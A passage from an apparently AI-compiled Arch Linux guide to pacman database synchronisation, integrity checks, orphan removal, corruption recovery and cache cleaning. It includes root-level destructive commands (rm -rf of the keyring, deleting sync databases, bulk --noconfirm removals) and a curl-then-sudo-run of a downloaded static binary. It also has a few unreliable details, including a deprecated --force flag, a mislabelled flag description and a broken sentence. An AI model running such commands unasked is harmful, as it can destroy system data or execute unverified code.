sudo pacman -Syyu
```


The double `-yy` forces a refresh of all package databases regardless of their apparent currency.[5][3]

**Use cases:**
- Switching to different mirror servers[5]
- Suspecting database corruption[5]
- Mirrors are out of sync with each other[5]
- Database files appear stale or incomplete

### Database Locations

#### Sync Database Directory

Synchronized repository databases are stored in:[6][7][1]

```
/var/lib/pacman/sync/
```


Each repository has its own database file:
- `core.db`
- `extra.db`
- `multilib.db`
- Custom repository databases

#### Database File Format

Database files are gzipped tar archives containing package metadata. They have extensions like `.db.tar.gz`, `.db.tar.xz`, or `.db.tar.zst` depending on compression.[8][1]

### Synchronization Issues

#### Database Lock Error

The most common synchronization error is the database lock issue:[9][6]

```
error: failed to synchronize all databases (unable to lock database)
```


**Cause:** Another process is using pacman, or a previous pacman operation didn't exit cleanly.[6]

**Check for running pacman processes:**
```
ps -aux | grep -i pacman
```


If you see only the grep command itself in the output, no other process is using pacman.[6]

**Solution - Remove lock file:**
```
sudo rm /var/lib/pacman/db.lck
```


The lock file `/var/lib/pacman/db.lck` is created when pacman runs and should be deleted automatically when pacman exits successfully. If pacman crashes or is forcefully terminated, this file may remain, preventing future operations.[6]

**When lock removal fails:**
In rare cases, deleting the lock file may not fix the issue. Try removing the entire sync database cache:[6]

```
sudo rm /var/lib/pacman/sync/*.*
```


The next `pacman -Sy` will take longer as it downloads all database files fresh, but this may resolve persistent issues.[6]

#### No Servers Configured Error

```
error: failed to synchronize all databases (no servers configured for repository)
```


**Cause:** Mirror list is missing, empty, or all mirrors are commented out.[10]

**Solution - Check mirrorlist:**
```
cat /etc/pacman.d/mirrorlist
```


Ensure at least one mirror is uncommented and properly formatted.

**Update mirrorlist:**
```
# For Arch Linux
sudo reflector --latest 10 --sort rate --save /etc/pacman.d/mirrorlist

# For Manjaro
sudo pacman-mirrors --fasttrack
```


Then synchronize again:
```
sudo pacman -Sy
```

#### Synchronization Timeout or Hanging

If synchronization hangs or times out:[11][12]

**Check network connectivity:**
```
ping archlinux.org
```

**Test mirror accessibility:**
```
curl -I https://mirror.example.com/archlinux/
```

**Change to faster mirrors:**
Edit `/etc/pacman.d/mirrorlist` to prioritize geographically closer mirrors.[11]

**Clear DNS cache:**
```
sudo systemd-resolve --flush-caches
```

**Try different mirrors:**
Comment out problematic mirrors in `/etc/pacman.d/mirrorlist` and retry synchronization.[11]

### Files Database Synchronization

#### Separate Files Database

The files database is distinct from the package database and must be synchronized separately:[1]

```
sudo pacman -Fy
```


This downloads the files database used for file searches with `pacman -F`. The files database contains complete file listings for all packages in repositories.[1]

#### Automated Files Database Updates

Enable automatic weekly updates of the files database:[1]

```
sudo systemctl enable --now pacman-filesdb-refresh.timer
```


This systemd timer refreshes the files database weekly without manual intervention.[1]

### Database Query Operations

#### Query Sync Database

Query repository packages (without installing) using the `-S` flag:[3][1]

```
pacman -Ss search_term    # Search repositories
pacman -Si package_name   # Show package info
pacman -Sl repository     # List repository packages
pacman -Sg group_name     # Show group members
```


These operations query the synchronized databases stored locally.[1]

#### Database Consistency

The sync databases must be synchronized before querying to get up-to-date results. If databases are stale, query results reflect outdated repository states.[1]

### Database Maintenance

#### Verify Database Integrity

Check the local package database for consistency issues:

```
sudo pacman -Dk
```

This verifies the integrity of the package database in `/var/lib/pacman/`.[3]

#### Clean Unused Databases

Remove databases for repositories that are no longer configured in `pacman.conf`:[3]

```
sudo pacman -Sc
```


This cleans unused sync databases along with uninstalled packages from the cache.[3]

### Synchronization Best Practices

**Regular synchronization:** Sync databases before every upgrade or installation operation.[2][3]

**Always upgrade after sync:** Never run `pacman -Sy` without following it with a full upgrade.[4]

**Force refresh judiciously:** Use `pacman -Syy` only when necessary, as it increases bandwidth usage.[5]

**Handle locks properly:** If encountering lock errors, verify no other pacman process is running before removing the lock file.[6]

**Monitor synchronization:** Pay attention to errors during database synchronization—they often indicate mirror or network issues requiring resolution.[11]

**Maintain valid mirrorlist:** Ensure `/etc/pacman.d/mirrorlist` contains working, accessible mirrors.[10]

### Alternative: checkupdates

For safely checking updates without synchronizing the main database, use `checkupdates` from `pacman-contrib`:[11]

```
checkupdates
```


This downloads databases to a temporary location, avoiding partial upgrade risks while still showing available updates.[4]

Sources
[1] pacman - ArchWiki https://wiki.archlinux.org/title/Pacman
[2] pacman-sync man https://linuxcommandlibrary.com/man/pacman-sync
[3] pacman(8) https://pacman.archlinux.page/pacman.8.html
[4] System maintenance - ArchWiki https://wiki.archlinux.org/title/System_maintenance
[5] How to Update the System (`pacman -Syu`) on Arch Linux https://www.siberoloji.com/how-to-update-the-system-pacman--syu-on-arch-linux/
[6] [Solved] 'failed to synchronize all databases' Error in Arch https://itsfoss.com/failed-to-synchronize-all-databases/
[7] Change the default location of the database directory https://bbs.archlinux.org/viewtopic.php?id=292182
[8] pacman/Tips and tricks - ArchWiki https://wiki.archlinux.org/title/Pacman/Tips_and_tricks
[9] pacman : error: failed to synchronize all databases (unable ... https://www.reddit.com/r/archlinux/comments/nvrny2/pacman_error_failed_to_synchronize_all_databases/
[10] Pacman error -- no servers configured to repository - Newbie https://forum.endeavouros.com/t/pacman-error-no-servers-configured-to-repository/56775
[11] Pacman hangs at 'synchronizing package databases ... https://bbs.archlinux.org/viewtopic.php?id=273113
[12] Pamac update stuck at Synchronizing package databases https://forum.manjaro.org/t/pamac-update-stuck-at-synchronizing-package-databases/164115
[13] How to resolve pacman synchronization errors in Arch Linux? https://www.facebook.com/groups/archlinuxen/posts/10160608325973393/
[14] Linux pacman Command with Practical Examples https://labex.io/tutorials/linux-linux-pacman-command-with-practical-examples-422849

## Database Integrity Checks

### Package File Verification

#### Basic File Presence Check

To verify that all files installed by a package are present on the system, use the `-Qk` flag:[1][2][3]

```
pacman -Qk package_name
```


This checks if files from the package still exist on the filesystem. It queries the local package database and verifies file presence.[1][2]

**Check all installed packages:**
```
pacman -Qk
```


This iterates through all installed packages and reports any missing files.[2]

#### Thorough Integrity Check

Pass the `-k` flag twice for a more comprehensive verification:[3][1][2]

```
pacman -Qkk package_name
```


The double `-kk` performs an extensive check including:[3]
- File presence verification
- File size comparison
- Modification time checks
- File permissions verification
- MD5 checksum validation
- SHA256 checksum validation

**Check all packages thoroughly:**
```
pacman -Qkk
```


This provides detailed integrity information for every installed package.[3]

### Understanding Check Output

#### Output Format

The thorough check (`-Qkk`) produces detailed output showing the status of each file:[3]

```
package_name: 1234 total files, 0 altered files
warning: package_name: /path/to/file (Size mismatch)
warning: package_name: /path/to/file (Modification time mismatch)
warning: package_name: /path/to/file (MD5 checksum mismatch)
```


**Status indicators:**
- **No output:** All files are intact and unmodified
- **warning:** Files have been modified or are missing
- **Size mismatch:** File size differs from original
- **Modification time mismatch:** File timestamp changed
- **MD5/SHA256 checksum mismatch:** File contents modified
- **Permission mismatch:** File permissions changed

#### Filtering Results

Show only packages with issues using grep:[2][3]

```
pacman -Qkk 2>&1 | grep -v "0 altered files"
```


This displays only packages with modified or missing files.[3]

**Show missing files only:**
```
pacman -Qkk 2>&1 | grep "missing files"
```

**Show checksum mismatches:**
```
pacman -Qkk 2>&1 | grep "checksum"
```


### Advanced Integrity Checking with paccheck

#### Installing paccheck

The `paccheck` utility from the `pacutils` package provides more advanced integrity checking:[4][1]

```
sudo pacman -S pacutils
```


#### Basic paccheck Usage

Check all installed packages for integrity:[4]

```
paccheck --md5sum --quiet
```


This performs MD5 checksum verification on all package files and displays only packages with issues.[4]

**Available options:**
- `--md5sum` - Verify MD5 checksums
- `--sha256sum` - Verify SHA256 checksums
- `--file-properties` - Check file properties (permissions, ownership)
- `--quiet` - Show only packages with issues
- `--depends` - Check dependencies
- `--opt-depends` - Check optional dependencies

**Comprehensive check:**
```
paccheck --md5sum --sha256sum --file-properties --quiet
```

This performs complete validation including checksums and file properties.[4]

### Package Signature Verification

#### Automatic Verification During Installation

Pacman automatically verifies package integrity during installation using GPG signatures:[5][6]

```
(1/1) checking keys in keyring
(1/1) checking package integrity
```


This validation depends on the `SigLevel` setting in `/etc/pacman.conf`.[1]

#### Signature Verification Errors

**Marginal trust error:**
```
error: package_name: signature from "..." is marginal trust
error: failed to commit transaction (invalid or corrupted package)
```


**Common causes:**
- Outdated GPG keyring
- Corrupted package signatures
- GPG configuration issues

**Resolution:**
```
sudo pacman -Sy archlinux-keyring
sudo pacman-key --refresh-keys
sudo pacman -Syu
```


This updates the keyring and refreshes key signatures.[7]

#### Keyring Reinitialization

For persistent signature issues, reinitialize the keyring:[6]

```
sudo rm -rf /etc/pacman.d/gnupg
sudo pacman-key --init
sudo pacman-key --populate archlinux
```


This completely rebuilds the GPG keyring from scratch.[6]

### Database Verification

#### Check Database Consistency

Verify the integrity of the local package database using `-D` operations:[8]

```
sudo pacman -Dk
```


This checks the package database structure for consistency issues.[8]

#### Rebuild Corrupted Database

If the database is corrupted, reinstall all packages to rebuild it:[2]

```
LC_ALL=C.UTF-8 pacman -Qk 2>/dev/null | grep -v ' 0 missing files' | cut -d: -f1 | while read -r package; do
  pacman -S "$package" --noconfirm
done
```


This identifies packages with issues and reinstalls them, rebuilding database entries.[2]

### Automated Integrity Checking

#### Scheduled Integrity Checks

Create a systemd timer for regular integrity checks:

```
# /etc/systemd/system/pacman-integrity-check.service
[Unit]
Description=Pacman Package Integrity Check

[Service]
Type=oneshot
ExecStart=/usr/bin/paccheck --md5sum --quiet
StandardOutput=journal
```

```
# /etc/systemd/system/pacman-integrity-check.timer
[Unit]
Description=Weekly Pacman Integrity Check

[Timer]
OnCalendar=weekly
Persistent=true

[Install]
WantedBy=timers.target
```

Enable the timer:
```
sudo systemctl enable --now pacman-integrity-check.timer
```

#### Integrity Check Scripts

Create a script to automate integrity checking and reporting:

```bash
#!/bin/bash
# Check package integrity and report issues

echo "Checking package integrity..."
ISSUES=$(pacman -Qkk 2>&1 | grep -v "0 altered files")

if [ -z "$ISSUES" ]; then
  echo "All packages verified successfully"
else
  echo "Issues found:"
  echo "$ISSUES"
fi
```

### Repairing Integrity Issues

#### Reinstall Modified Packages

For packages with integrity issues, reinstall them:[2]

```
sudo pacman -S package_name
```


This downloads fresh package files and reinstalls, restoring original files.[2]

**Force reinstall with overwrite:**
```
sudo pacman -S --overwrite "*" package_name
```

This reinstalls and overwrites all files, including modified ones.[2]

#### Reinstall All Packages with Issues

Identify and reinstall all packages with integrity problems:

```
pacman -Qkk 2>&1 | grep -v "0 altered files" | cut -d: -f1 | sort -u | xargs sudo pacman -S --noconfirm
```

This finds packages with issues and reinstalls them automatically.

### Configuration File Handling

#### Expected Modifications

Configuration files in `/etc/` are expected to be modified by users. Integrity checks reporting modifications to configuration files are normal and not concerning.[2]

**View backup file status:**
```
pacman -Qii package_name
```


This shows which configuration files have been modified and which remain unmodified.[2]

### Common Integrity Issues

#### Missing Files

Files may be missing if:
- Manually deleted by user
- Removed by other software
- Disk corruption
- Incomplete installation

**Resolution:** Reinstall the package to restore missing files.

#### Checksum Mismatches

Checksum mismatches indicate:
- User modifications (especially in `/etc/`)
- File corruption
- Malware or security compromise
- Normal updates to runtime-generated files

**Resolution:** Investigate the cause before reinstalling. User modifications to configuration files are expected and safe.

#### Permission Mismatches

Permission changes may result from:
- Manual chmod/chown operations
- Security hardening modifications
- Incorrect restoration from backups

**Resolution:** Reinstall package or manually correct permissions.

### Best Practices

**Regular checks:** Perform integrity checks periodically to detect issues early.[4]

**After system issues:** Run integrity checks after crashes, power failures, or disk errors.

**Before major changes:** Verify system integrity before major upgrades or system modifications.

**Document modifications:** Keep records of intentional file modifications to distinguish them from problems.

**Use paccheck for automation:** The `paccheck` utility provides scriptable, precise integrity validation.[4]

**Don't panic on warnings:** Configuration file modifications are normal and expected.[2]

Sources
[1] [SOLVED] How to check integrity of package files / Pacman ... https://bbs.archlinux.org/viewtopic.php?id=195645
[2] pacman - ArchWiki https://wiki.archlinux.org/title/Pacman
[3] Checking Installed Package Integrity (   Checksums/File Changes) https://buymeacoffee.com/politictech/arch-linux-checking-installed-package-integrity-checksums-file-changes
[4] Check all installed packages for integrity - Pacman & AUR helpers https://forum.endeavouros.com/t/check-all-installed-packages-for-integrity/5297
[5] ELI5: Does pacman -S automatically verify package integrity? - Reddit https://www.reddit.com/r/archlinux/comments/69n2ty/eli5_does_pacman_s_automatically_verify_package/
[6] Arch Linux ARM • View topic - Package integrity check failing https://archlinuxarm.org/forum/viewtopic.php?f=15&t=16707
[7] Pacman update error, corrupted packages - Manjaro Linux Forum https://forum.manjaro.org/t/pacman-update-error-corrupted-packages/114336
[8] pacman(8) https://pacman.archlinux.page/pacman.8.html
[9] How to check file system integrity in Linux? - Tencent Cloud https://www.tencentcloud.com/techpedia/112534
[10] Cannot upgrade Arch Linux (pacman -Syu not working) https://stackoverflow.com/questions/35251359/cannot-upgrade-arch-linux-pacman-syu-not-working

## Orphaned Package Detection

### What Are Orphaned Packages

Orphans are packages that were installed as dependencies and are no longer required by any package. They accumulate through normal system usage when:[1][2][3][4]

- Packages are removed without the `-s` flag (which removes unneeded dependencies)[2]
- System updates (`pacman -Syu`) change package dependencies[2]
- A package no longer requires dependencies it previously needed[2]

**Important:** A system update does not automatically remove orphans. You must explicitly clean them up.[2]

### Basic Orphan Detection

#### List All Orphaned Packages

To list all orphaned packages, use the `-Qdt` flags:[5][6][3][1]

```
pacman -Qdt
```


This displays packages with:
- `-Q` - Query installed packages
- `-d` - Installed as dependencies (not explicitly installed)
- `-t` - Not required by any package (unrequired)

**Output format:**
```
package-name 1.0.0-1
another-package 2.3.1-2
```

#### List Orphans (Names Only)

For scripting or piping to removal commands, use quiet mode:[3][1][2]

```
pacman -Qdtq
```


The `-q` flag shows only package names without versions:
```
package-name
another-package
```

**Important:** The `-q` option is crucial when piping to removal commands, as extra information causes `pacman -R` to error out.[2]

### Including Optional Dependencies

#### Strict Orphan Detection

The basic `-Qdt` command lists only **true orphans**—packages that are not required or optionally required by any package.[1]

#### Include Optional Requirements

To also list packages that are optionally required by another package, pass the `-t` flag twice:[1]

```
pacman -Qdtt
```


This expands the list to include packages that satisfy optional dependencies, not just required dependencies.[1]

### Removing Orphaned Packages

#### Basic Removal Command

To remove all orphaned packages, pipe the list to `pacman -Rns`:[4][3][1][2]

```
sudo pacman -Rns $(pacman -Qdtq)
```


Or using pipe syntax:
```
pacman -Qdtq | sudo pacman -Rns -
```


The `-` at the end tells pacman to read the package list from standard input.[3]

**Breakdown of flags:**
- `-R` - Remove packages
- `-n` - Remove configuration files too
- `-s` - Remove unnecessary dependencies recursively

**Warning:** This command is very aggressive and can include packages that are optional dependencies of other packages.[4]

### Safer Orphan Removal

#### Iterative Removal Method

A safer approach is to run the removal command multiple times without the `-s` flag:[4][6]

```
sudo pacman -R $(pacman -Qdtq)
```


Run this command repeatedly until `pacman -Qdtq` returns nothing. This prevents cascading removals that might affect optional dependencies.[6][4]

#### Automated Iterative Function

Create a function for safer iterative removal:[4]

```bash
orph() {
  while [[ $(pacman -Qdtq) ]]
  do
    sudo pacman -R $(pacman -Qdtq)
  done
}
```


Add this to your shell configuration file (`.bashrc`, `.zshrc`) and run `orph` to safely remove orphans.[4]

### Important Warnings

#### Review Before Removal

**Critical:** Always review the list of orphans carefully before removing them. Some orphaned packages may still be useful:[3][4]

1. Check what will be removed:
   ```
   pacman -Qdtq
   ```

2. Investigate unfamiliar packages:
   ```
   pacman -Qi package_name
   ```

3. Only proceed if you're certain the packages are unneeded

**Not all orphans should be removed:** An orphan is just a package installed as a dependency but no longer required by any package—it doesn't necessarily mean the package is useless.[4]

#### Optional Dependencies Risk

The recursive removal method (`pacman -Rns`) can remove packages that are optional dependencies of other installed packages. While these packages aren't strictly required, they may provide functionality you want to keep.[4]

#### Alternative: Mark as Explicit

Instead of removing an orphaned package, you can mark it as explicitly installed to keep it:[5][4]

```
sudo pacman -D --asexplicit package_name
```


This changes the package's install reason from "dependency" to "explicit," preventing it from appearing in orphan lists.[5]

### Detecting Additional Unneeded Packages

#### Beyond Simple Orphans

Some unneeded packages aren't detected by the standard `-Qdt` method:[1]

- Dependency cycles (circular dependencies)
- Excessive dependencies (fulfilled more than once)
- Some non-explicit optionals

**Advanced detection:**
```
pacman -Qqd | pacman -Rsu --print -
```


This lists all packages installed as dependencies and simulates their removal, showing what can be safely removed.[1][3]

**To remove all at once (dangerous):**
```
pacman -Qqd | pacman -Rsu -
```


**Warning:** This is extremely aggressive. Review the `--print` output first.[1]

#### Duplicate Providers

Detect packages that provide the same item (e.g., multiple font packages):[1]

```
awk '/%(NAME|PROVIDES)%/{flag=1;next}/^$/{flag=0}flag{ printf "%s\t%s\n", FILENAME, $0}' /var/lib/pacman/local/*/desc | sed 's%/var/lib/pacman/local/\(.*\)/desc%\1%g' | sort -k2 | uniq -Df1 | column -etN Package,Provides
```


Review this output and carefully remove redundant packages you don't require.[1]

### Automation and Monitoring

#### Pacman Hook for Orphan Detection

Create a hook to notify when packages become orphaned:[1]

```
# /etc/pacman.d/hooks/orphan-notify.hook
[Trigger]
Operation = Install
Operation = Remove
Operation = Upgrade
Type = Package
Target = *

[Action]
Description = Checking for orphaned packages...
When = PostTransaction
Exec = /usr/bin/bash -c "/usr/bin/pacman -Qdt || /usr/bin/echo '=> None found.'"
```


This notifies you after every transaction if orphans are present.[1]

**AUR Package:**
The `pacman-log-orphans-hook` package from AUR provides a more verbose version of this hook.[1]

#### Alias for Quick Cleanup

Create an alias for convenient orphan removal:[4]

```bash
# Add to ~/.bashrc or ~/.zshrc
alias cleanup='sudo pacman -Rns $(pacman -Qdtq)'
```


Then simply run `cleanup` to remove orphans.

### Package Install Reason Tracking

#### How Pacman Tracks Packages

Pacman tracks two types of install reasons:[7][4]

**Explicitly installed:** Packages installed directly by the user with `pacman -S`[9][4]

**Installed as dependency:** Packages installed automatically to satisfy dependencies[7][4]

When a package is no longer required by any explicitly installed package, it becomes an orphan.[4]

#### Checking Install Reason

View a package's install reason:

```
pacman -Qi package_name | grep "Install Reason"
```

**Output:**
```
Install Reason      : Explicitly installed
```
or
```
Install Reason      : Installed as a dependency for another package
```

### Common Workflows

#### After Major Removals

After removing large software suites or desktop environments:

```
sudo pacman -Rns package_name
pacman -Qdt                          # Check for orphans
sudo pacman -Rns $(pacman -Qdtq)   # Remove orphans
```

#### Regular Maintenance

Periodic orphan cleanup as part of system maintenance:

```
# 1. Update system
sudo pacman -Syu

# 2. Check for orphans
pacman -Qdt

# 3. Review and remove
sudo pacman -Rns $(pacman -Qdtq)
```

#### Pre-Removal Verification

Before removing orphans, verify they aren't needed:

```
pacman -Qdtq > orphans.txt          # Save list
cat orphans.txt                     # Review
# Edit orphans.txt to remove packages you want to keep
cat orphans.txt | sudo pacman -R -  # Remove remaining
```

### Best Practices

**Regular checks:** Check for orphans after major package removals or system updates.[2]

**Never automate removal:** Don't automatically remove orphans with hooks or scripts—always review first.[4]

**Use safer methods:** Prefer iterative removal without `-s` over aggressive recursive removal.[4]

**Mark keepers:** If you want to keep an orphan, mark it as explicit rather than repeatedly ignoring it.[5][4]

**Review optional dependencies:** Understand that some orphans may provide optional functionality you want.[4]

**Backup critical systems:** Always maintain backups before bulk package removal operations.[3]

Sources
[1] pacman/Tips and tricks - ArchWiki https://wiki.archlinux.org/title/Pacman/Tips_and_tricks
[2] Cleaning up unused packages with Pacman https://slar.se/cleaning-up-with-pacman.html
[3] How to remove orphaned unused packages in Arch Linux https://www.cyberciti.biz/faq/delete-remove-orphaned-unused-packages-arch-linux-pacman-command/
[4] Discussion about handling orphaned packages https://forum.garudalinux.org/t/discussion-about-handling-orphaned-packages/30881
[5] Removing unused packages (orphans) command https://www.reddit.com/r/archlinux/comments/1corozn/removing_unused_packages_orphans_command/
[6] How to delete orphaned packages - Pacman vs. Pamac https://forum.endeavouros.com/t/how-to-delete-orphaned-packages-pacman-vs-pamac/45218
[7] how does pacman detect when a package is orphan or " ... https://www.facebook.com/groups/archlinuxen/posts/10155407105783393/
[8] How to use Pacman to automatically remove ... https://www.tencentcloud.com/techpedia/102254
[9] Removing unused packages (orphans) / Pacman & ... https://bbs.archlinux.org/viewtopic.php?id=281968

## Database Corruption Recovery

### Signs of Database Corruption

A broken or corrupted pacman database may result in errors such as:[1]

```
error: failed to init transaction (unable to lock database)
error: database file for 'core' does not exist
error: could not find or read package
error: failed to commit transaction (invalid or corrupted package)
warning: database file for 'extra' is missing
```


These errors indicate issues like:[1]
- Database corruption
- Missing or accidentally deleted files
- Inconsistent metadata due to forced removals
- Interrupted transactions (system crash during upgrade)

### Safety Precautions

#### Backup the Database

Before attempting recovery, backup the database if still accessible:[1]

```
sudo cp -a /var/lib/pacman/ /var/lib/pacman.bak/
```


#### Use Live ISO if Needed

If your system is not booting, mount partitions and chroot into your system:[2][1]

```
# Boot from Arch installation media
mount /dev/sdXn /mnt
mount /dev/sdXn /mnt/boot  # If separate boot partition
arch-chroot /mnt
```


### Step 1: Check and Remove Database Lock

#### Remove Lock File

If pacman complains about a locked database:[3][4][1]

```
sudo rm /var/lib/pacman/db.lck
```


**Important:** Only do this if you're certain no pacman process is currently running.[1]

The lock file `/var/lib/pacman/db.lck` is created when pacman runs and prevents multiple instances from corrupting the database. If pacman crashes or is forcefully terminated, this file may remain and block future operations.[3]

#### Verify No Running Processes

Check for running pacman processes before removing the lock:[4]

```
ps -aux | grep -i pacman
```


If you see only the grep command itself, no other process is using pacman.[4]

### Step 2: Update Sync Databases

#### Refresh Repository Databases

If sync databases are missing or outdated, refresh them:[1]

```
sudo pacman -Sy
```


If that fails with missing files in `/var/lib/pacman/sync`, delete them and try again:[4][1]

```
sudo rm -f /var/lib/pacman/sync/*.db
sudo pacman -Sy
```


This downloads fresh `.db` files for all enabled repositories in `/etc/pacman.conf`.[5]

#### Force Complete Refresh

For persistent database issues, force re-download all databases:[5][1]

```
sudo pacman -Syy
```


### Step 3: Reinstall Broken Packages

#### Single Package Reinstallation

If a specific package has corrupted meta[6][1]

```
sudo pacman -S package-name --overwrite '*'
```


This forces reinstallation and overwrites any existing files.[1]

**Without dependency checks:**
```
sudo pacman -S --needed --noconfirm package-name
```


#### Recover Missing Package Metadata

If entire package directories are missing from `/var/lib/pacman/local/`, the files may still exist on your system:[1]

**Download package from archive:**
```
wget https://archive.archlinux.org/packages/p/package-name/package-name-version.pkg.tar.zst
```


**Reinstall to rebuild database entry:**
```
sudo pacman -U package-name-version.pkg.tar.zst --overwrite '*'
```


This reinstalls the package and re-registers it in the local database.[1]

### Step 4: Rebuild Database for Missing Entries

#### Identify Packages with Missing mtree

Use this command to find and reinstall packages with database corruption:[5]

```
pacman --dbonly -S $(LC_ALL=C pacman -Qkk 2>/dev/null | sed '/no mtree/!d; s/:.*//g')
```


**Explanation:**
- `pacman --dbonly -S` - Reinstalls packages but only modifies the database without extracting files
- `pacman -Qkk` - Checks integrity of installed packages
- `LC_ALL=C` - Ensures consistent locale settings for predictable output
- `sed '/no mtree/!d; s/:.*//g'` - Filters output to identify packages with missing mtree entries (indicator of database corruption)

### Step 5: Restore Complete Local Database

#### Method 1: Using pacrecover Script

The official method for complete database restoration:[7]

**Generate package lists:**
```
paclog-pkglist /var/log/pacman.log | ./pacrecover >files.list 2>pkglist.orig
```


This creates:
- `files.list` - Paths to locally available packages
- `pkglist.orig` - Packages missing from cache (must be downloaded)

**Restrict to repository packages:**
```
{ cat pkglist.orig; pacman -Slq; } | sort | uniq -d > pkglist
```


**Ensure base packages included:**
```
comm -23 <({ echo base ; expac -l '\n' '%E' base; } | sort) pkglist.orig >> pkglist
```


**Define recovery helper function:**
```bash
recovery-pacman() {
  pacman "$@" \
    --log /dev/null \
    --noscriptlet \
    --dbonly \
    --overwrite "*" \
    --nodeps \
    --needed
}
```


**Perform recovery:**
```
recovery-pacman -Sy
recovery-pacman -S $(cat files.list)
recovery-pacman -S $(cat pkglist)
```


#### Method 2: Reinstall All Packages

Reinstall all packages from the explicitly installed list:[1]

```
comm -12 <(pacman -Qqen | sort) <(pacman -Qq | sort) > pkglist.txt
sudo pacman -S --needed - < pkglist.txt
```


#### Method 3: Reinstall from Cache

If `/var/cache/pacman/pkg/` is intact, reinstall from cached packages:[1]

```
cd /var/cache/pacman/pkg/
sudo pacman -U *.pkg.tar.zst --overwrite '*' --noconfirm
```


This repopulates the local database from cached packages.[1]

### Step 6: Fix Mirror Configuration

#### Update Mirror List

A misconfigured or outdated mirror can break sync operations:[1]

```
sudo pacman -S reflector
sudo reflector --latest 10 --protocol https --sort rate --save /etc/pacman.d/mirrorlist
```


**Then retry:**
```
sudo pacman -Syy
```


### Step 7: Repair GPG Keyring

#### Regenerate Keys and Signatures

If pacman throws GPG signature errors:[8][1]

```
sudo pacman-key --init
sudo pacman-key --populate archlinux
```


#### Complete Keyring Rebuild

For persistent signature issues, delete and rebuild the entire keyring:[1]

```
sudo rm -r /etc/pacman.d/gnupg
sudo pacman-key --init
sudo pacman-key --populate archlinux
```


**Update archlinux-keyring first:**
```
sudo pacman -Sy archlinux-keyring
```


### Step 8: Check for Missing ALPM_DB_VERSION

#### Verify Database Version File

If database operations fail with "failed to initialise alpm library":[7]

```
ls /var/lib/pacman/local/ALPM_DB_VERSION
```


**If missing, run:**
```
sudo pacman-db-upgrade
sudo pacman -Sy
```


This recreates the database version file and synchronizes repositories.[7]

### Recovery from Pacman Cache

#### Create Empty Metadata Files

If package metadata is missing but files exist on the system:[6]

1. Identify the package and version
2. Create empty metadata files in `/var/lib/pacman/local/package-version/`
3. Reinstall with force:
   ```
   sudo pacman -U --force /var/cache/pacman/pkg/package.pkg.tar.zst
   ```


This allows pacman to reinstall and regenerate proper metadata.[6]

### Prevention Strategies

#### Best Practices

**Never interrupt pacman:** Especially during upgrades. Always let transactions complete.[1]

**Avoid --force:** Unless absolutely necessary, as it can cause file conflicts and orphan packages.[1]

**Enable automatic cache cleaning:**
```
sudo systemctl enable paccache.timer
sudo systemctl start paccache.timer
```


**Keep backups:** Of important directories like `/etc`, `/var/lib/pacman`, and `/boot`.[5]

**Use snapshots:** Consider using `timeshift` or `snapper` with Btrfs for snapshot-based system recovery.[2][1]

### Using pacman-contrib Tools

Install useful maintenance utilities:[1]

```
sudo pacman -S pacman-contrib
```


**Available tools:**
- `paccache` - Clean old cached packages
- `checkupdates` - Check for updates without syncing
- `paclog` - View pacman logs
- `pacdiff` - Identify modified config files

These tools help audit and fix underlying issues after database recovery.[1]

### Emergency Recovery with pacman-static

If pacman itself is broken and cannot run:[9][10]

```
curl -L -o pacman-static https://pkgbuild.com/~morganamilo/pacman-static/x86_64/bin/pacman-static
chmod +x pacman-static
sudo ./pacman-static -Syu pacman
```

This static version bypasses library dependencies and can repair a broken pacman installation.[10][9]

Sources
[1] How to Recover from a Broken `pacman` Database on ... https://www.siberoloji.com/how-to-recover-from-a-broken-pacman-database-on-arch-linux/
[2] Recovering from a Corrupted Arch Linux Upgrade https://www.soimort.org/notes/170407
[3] Fixing pacman error : r/archlinux https://www.reddit.com/r/archlinux/comments/sijck2/fixing_pacman_error/
[4] [Solved] 'failed to synchronize all databases' Error in Arch https://itsfoss.com/failed-to-synchronize-all-databases/
[5] Fixing a Corrupt Pacman Database in Arch Linux - tsc.id.au https://tsc.id.au/til/2024/12/fixing-a-corrupt-pacman-database-in-arch-linux/
[6] [SOLVED] Corrupted pacman database / ... https://bbs.archlinux.org/viewtopic.php?id=230357
[7] pacman/Restore local database https://wiki.archlinux.org/title/Pacman/Restore_local_database
[8] Pacman/Pamac - Invalid or corrupted database - Support https://forum.manjaro.org/t/pacman-pamac-invalid-or-corrupted-database/127063
[9] How to repair broken packages using Pacman? https://www.tencentcloud.com/techpedia/102256
[10] pacman - ArchWiki https://wiki.archlinux.org/title/Pacman
[11] fix corrupted pacman database - ArcoLinux https://www.youtube.com/watch?v=icICjb18I1k


# Cache Management

## Cache Cleaning Strategies

### Understanding the Package Cache

The package cache in `/var/cache/pacman/pkg/` stores all downloaded packages. Pacman does not automatically remove old or uninstalled package versions, causing the directory to grow indefinitely without manual intervention. Over time, this can consume significant disk space—users commonly report 10-40GB of cached packages.[1][2][3][4]

### Why Keep the Cache

**Downgrading capability:** Allows reverting to previous package versions without downloading from archives.[2][4]

**Offline reinstallation:** Enables reinstalling packages without internet access.[4]

**System recovery:** Provides a local backup of packages for emergency restoration.[4]

**Tradeoff:** Balancing disk space against recovery/downgrade capabilities requires periodic cleaning.[4]

### Method 1: Using paccache (Recommended)

#### Basic paccache Command

The `paccache` script from `pacman-contrib` is the recommended method for cache cleaning:[3][2][4]

```
sudo paccache -r
```


**Default behavior:** Removes all cached versions of packages except the three most recent versions. This strikes a balance between saving space and retaining downgrade/reinstall capabilities.[3][2][4]

#### Install pacman-contrib

If `paccache` is not available, install it first:[3][4]

```
sudo pacman -S pacman-contrib
```


#### Customizing Retention Count

**Keep only one version:**
```
sudo paccache -rk1
```


This keeps only the most recent version of each installed package and removes all others.[2][4]

**Keep two versions:**
```
sudo paccache -rk2
```

**Keep five versions:**
```
sudo paccache -rk5
```

The `-k` flag specifies how many recent versions to retain.[2]

#### Remove Uninstalled Packages

**Remove all cached versions of uninstalled packages:**
```
sudo paccache -ruk0
```


The `-u` flag limits the action to uninstalled packages, and `-k0` keeps zero versions (removes all).[4][2]

#### Combined Strategy (Most Popular)

A highly recommended combination removes uninstalled packages completely while keeping recent versions of installed packages:[1]

```
sudo paccache -ruk0 && sudo paccache -rk3
```


This two-step approach:
1. Removes all cached versions of uninstalled packages
2. Keeps the three most recent versions of installed packages

### Method 2: Using Pacman Built-in Options

#### pacman -Sc (Moderate Cleaning)

Remove all cached packages that are not currently installed:[5][2][4]

```
sudo pacman -Sc
```


**Actions performed:**
- Removes all uninstalled package files from cache[4]
- Keeps only packages that are currently installed[4]
- Removes unused repository databases[4]

**Confirmation prompt:**
```
Do you want to remove all other packages from cache? [y/N]
